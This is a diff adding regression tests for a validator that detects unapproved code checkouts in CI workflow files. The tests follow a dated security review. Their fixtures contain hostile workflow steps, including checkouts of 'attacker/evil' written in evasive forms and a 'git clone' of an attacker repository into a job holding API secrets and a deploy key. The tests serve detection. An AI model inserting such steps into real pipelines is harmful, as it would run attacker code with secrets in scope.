@@ -82,3 +82,80 @@ describe('engine checkout pin alignment', () => {
     );
   });
 });
+
+// Regression tests for the bypasses found in the 2026-07-27 security review.
+// Each of these previously returned "OK" while attacker-controlled code would
+// have executed with APIFY/DATAFORSEO/ANTHROPIC secrets and the engine deploy
+// key in scope.
+describe('security review 2026-07-27 — checkout detection cannot be evaded', () => {
+  const engineStep = (repo, ref) =>
+    `      - name: Checkout engine\n` +
+    `        uses: actions/checkout@v4\n` +
+    `        with:\n` +
+    `          repository: ${repo}\n` +
+    `          ref: ${ref}\n` +
+    `          path: engine\n`;
+  const wrap = (steps, env = 'ENGINE_REF: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n') =>
+    `name: t\nenv:\n  ENGINE_REPO: acme/engine\n  ${env}jobs:\n  j:\n    steps:\n${steps}`;
+  const APPROVED = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
+
+  it('sees a checkout written in the "- uses:" dash form', () => {
+    const yaml = wrap(
+      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
+        `      - uses: actions/checkout@v4\n` +
+        `        with:\n` +
+        `          repository: attacker/evil\n` +
+        `          ref: main\n` +
+        `          path: evil\n`,
+    );
+    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
+    assert.ok(r.failures.some((f) => f.includes('attacker/evil')), 'dash-form checkout must be detected');
+  });
+
+  it('sees a checkout line carrying a trailing comment', () => {
+    const yaml = wrap(
+      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
+        `      - name: sneak\n` +
+        `        uses: actions/checkout@v4  # routine\n` +
+        `        with:\n` +
+        `          repository: attacker/evil\n` +
+        `          ref: main\n` +
+        `          path: evil\n`,
+    );
+    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
+    assert.ok(r.failures.some((f) => f.includes('attacker/evil')), 'commented checkout must be detected');
+  });
+
+  it('refuses to guess when ENGINE_REF is declared twice with different values', () => {
+    const yaml = wrap(
+      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
+        `      - name: shadow\n` +
+        `        env:\n` +
+        `          ENGINE_REF: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n` +
+        `        run: echo hi\n`,
+    );
+    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
+    assert.ok(r.failures.some((f) => f.includes('ambiguous')), 'conflicting ENGINE_REF must fail closed');
+  });
+
+  it('flags code fetched outside actions/checkout', () => {
+    const yaml = wrap(
+      engineStep('acme/engine', '${{ env.ENGINE_REF }}') +
+        `      - name: fetch\n` +
+        `        run: git clone https://github.com/attacker/evil.git evil\n`,
+    );
+    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
+    assert.ok(r.failures.some((f) => f.includes('outside actions/checkout')), 'external clone must be flagged');
+  });
+
+  it('a dash-form step does not swallow the next step\'s repository/ref', () => {
+    const yaml = wrap(
+      `      - uses: actions/checkout@v4\n` +
+        `        with:\n` +
+        `          ref: some-branch\n` +
+        engineStep('acme/engine', '${{ env.ENGINE_REF }}'),
+    );
+    const r = checkWorkflowText('t.yml', yaml, 'acme/engine', APPROVED);
+    assert.deepStrictEqual(r.failures, [], 'a self-checkout plus one engine checkout is valid');
+  });
+});
